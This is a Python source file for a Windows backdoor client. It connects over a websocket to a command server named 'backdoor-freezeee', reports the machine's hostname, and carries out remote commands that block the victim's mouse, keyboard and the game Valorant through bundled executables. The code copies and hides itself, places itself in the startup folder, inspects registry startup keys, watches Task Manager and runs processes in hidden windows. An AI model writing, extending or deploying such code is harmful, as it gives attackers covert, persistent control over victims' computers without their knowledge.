from time import sleep
from messagehandler import handle_message
from implementations import *
import asyncio
import websockets  # type: ignore
import sys
import os
import winreg
import subprocess
import socket
import shutil

server_url = "wss://backdoor-freezeee.onrender.com"

CLIENT_NAME = socket.gethostname()


if getattr(sys, 'frozen', False):
    current_path = sys.executable
else:
    current_path = os.path.abspath(__file__)

dir_path = os.path.dirname(current_path)
filename = os.path.basename(current_path)

name, ext = os.path.splitext(filename)

new_name = name + "l" + ext
new_path = os.path.join(dir_path, new_name)

if not os.path.exists(new_path):
    shutil.copy2(current_path, new_path)

def will_startup_execute(filename):
    filename = filename.lower()

    approved_keys = [
        (winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder"),
        (winreg.HKEY_LOCAL_MACHINE,
         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder")
    ]

    for root, path in approved_keys:
        try:
            with winreg.OpenKey(root, path) as key:
                i = 0
                while True:
                    name, value, _ = winreg.EnumValue(key, i)
                    if name.lower() == filename:
                        return value[0] != 0x03
                    i += 1
        except (FileNotFoundError, OSError):
            pass

    return True

async def pinger(ws):
    try:
        while True:
            await asyncio.sleep(5)
            await ws.send("PING")
    except asyncio.CancelledError:
        pass
    except Exception:
        pass

block_exe = resource_path("block_inputs.exe")
valorantblock_exe = resource_path("valorantblock.exe")
if not os.path.isfile(block_exe) or not os.path.isfile(valorantblock_exe):
    sys.exit(1)

startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP

state = {
    "mouse": None,
    "keyboard": None,
    "valorant": None,
}

if not im_in_startup():
    hide_file(current_exe)
    sleep(3)
    move_to_startup(current_exe)
monitor_taskmgr()
check_reinstall()

async def receiver(ws):
    try:
        async for msg in ws:
            if msg != "PONG":
                handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags)
    except Exception:
        pass

async def main():
    print("Connecting to server...")
    ws = None

    while True:
        try:
            if ws is None or getattr(ws, "closed", True):
                try:
                    ws = await asyncio.wait_for(
                        websockets.connect(server_url),
                        timeout=1400
                    )
                    print("Connected!")
                except asyncio.TimeoutError:
                    print("Timeout ao conectar")
                    ws = None
                    await asyncio.sleep(5)
                    continue
                except Exception as e:
                    print("Erro ao conectar:", e)
                    ws = None
                    await asyncio.sleep(5)
                    continue

                try:
                    await ws.send(f"HELLO_{CLIENT_NAME}")
                    response = await ws.recv()
                except Exception as e:
                    print("Handshake error:", e)
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                print("Received:", response)
                if response != "WELCOME":
                    print("Handshake failed")
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                receiver_task = asyncio.create_task(receiver(ws))
                pinger_task = asyncio.create_task(pinger(ws))

                done, pending = await asyncio.wait([receiver_task, pinger_task], return_when=asyncio.FIRST_EXCEPTION)

                for t in pending:
                    t.cancel()

                try:
                    await ws.close()
                except Exception:
                    pass
                ws = None

            else:
                await asyncio.sleep(1)

        except Exception as e:
            print("Connection error:", e)
            try:
                if ws:
                    await ws.close()
            except Exception:
                pass
            ws = None
            await asyncio.sleep(5)

asyncio.run(main())
